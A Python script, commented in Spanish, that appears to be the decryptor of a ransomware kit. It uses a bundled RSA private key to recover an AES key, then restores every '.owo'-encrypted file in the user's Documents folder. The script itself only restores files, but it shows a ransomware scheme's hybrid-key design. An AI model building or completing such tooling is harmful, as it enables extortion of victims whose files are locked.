import os
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives import serialization, hashes
import sys

# Función para leer la clave privada desde el archivo 'private_key.pem'
def leer_clave_privada():
    # Si estamos en PyInstaller, usar la carpeta _MEIPASS para acceder al archivo
    if getattr(sys, 'frozen', False):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))

    # Ruta completa del archivo 'private_key.pem'
    ruta_clave_privada = os.path.join(base_path, 'private_key.pem')

    # Leer la clave privada desde el archivo
    with open(ruta_clave_privada, 'rb') as f:
        private_key = serialization.load_pem_private_key(
            f.read(),
            password=None,  
            backend=default_backend()
        )

    return private_key

# Función para descifrar la clave AES con RSA usando la clave privada
def descifrar_clave_aes(clave_aes_cifrada, private_key):
    # Decodificar la clave AES cifrada de Base64
    clave_aes_cifrada_bytes = base64.b64decode(clave_aes_cifrada)

    # Descifrar la clave AES con la clave privada RSA
    clave_aes = private_key.decrypt(
        clave_aes_cifrada_bytes,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    return clave_aes

# Función para descifrar archivos con AES
def descifrar_archivo_aes(archivo, clave_aes):
    with open(archivo, 'rb') as f:
        iv = f.read(16)  # Leer el IV del archivo cifrado
        datos_cifrados = f.read()  # Leer los datos cifrados

    # Crear el objeto de cifrado AES en modo CBC con el IV leído
    cipher = AES.new(clave_aes, AES.MODE_CBC, iv)

    # Descifrar los datos y remover el padding
    datos_descifrados = unpad(cipher.decrypt(datos_cifrados), AES.block_size)

    # Guardar los datos descifrados en el archivo original (sin la extensión .owo)
    archivo_descifrado = archivo.replace('.owo', '')
    with open(archivo_descifrado, 'wb') as f:
        f.write(datos_descifrados)

# Función principal para descifrar todos los archivos en la carpeta Documentos
def descifrar_archivos_documentos():
    user_profile = os.environ['USERPROFILE']
    documents_dir = os.path.join(user_profile, 'Documents')

    # Leer la clave privada desde el archivo 'private_key.pem'
    private_key = leer_clave_privada()

    # Leer la clave AES cifrada desde el archivo
    with open(os.path.join(documents_dir, 'clave_aes_cifrada.owo'), 'r') as f:
        clave_aes_cifrada = f.read()

    # Descifrar la clave AES con la clave privada RSA
    clave_aes = descifrar_clave_aes(clave_aes_cifrada, private_key)

    # Recorrer todos los archivos en la carpeta Documentos
    for foldername, subfolders, filenames in os.walk(documents_dir):
        for filename in filenames:
            if filename.endswith('.owo'):  
                file_path = os.path.join(foldername, filename)
                # Descifrar el archivo con AES
                descifrar_archivo_aes(file_path, clave_aes)
                print(f'Archivo descifrado: {file_path}')

# Ejecutar la función principal
descifrar_archivos_documentos()
